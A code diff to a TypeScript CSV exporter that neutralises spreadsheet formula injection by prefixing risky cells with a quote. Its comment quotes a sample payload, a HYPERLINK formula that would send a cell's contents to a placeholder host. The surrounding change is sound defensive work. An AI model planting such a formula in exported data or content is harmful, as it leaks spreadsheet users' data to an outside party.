@@ -43,10 +43,26 @@ const COLUMNS = [
   'outlier_score', 'tags', 'domains',
 ] as const;
 
-/** RFC 4180: quote everything, double any embedded quote. */
+/**
+ * RFC 4180: quote everything, double any embedded quote.
+ *
+ * Then one thing RFC 4180 does not cover. Post text and company names are
+ * attacker-controlled -- they are whatever a competitor typed into Instagram --
+ * and Excel, Numbers and Sheets all treat a cell beginning `=`, `+`, `-` or `@`
+ * as a formula no matter how correctly it was quoted. A competitor who posts
+ * `=HYPERLINK("http://x/?"&A1,"click")` would otherwise get that formula
+ * evaluated inside an editor's spreadsheet. Prefixing a single quote makes the
+ * cell inert; the leading quote is not displayed by any of the three.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
 function cell(value: string | number | null | undefined): string {
   if (value === null || value === undefined) return '""';
-  return '"' + String(value).replace(/"/g, '""') + '"';
+  // Numbers we produced ourselves are never neutralized, so a metric column
+  // stays a metric column and a negative value still sorts as one.
+  const text = String(value);
+  const safe = typeof value === 'string' && FORMULA_LEAD.test(text) ? "'" + text : text;
+  return '"' + safe.replace(/"/g, '""') + '"';
 }
 
 function row(p: PostDto): string {
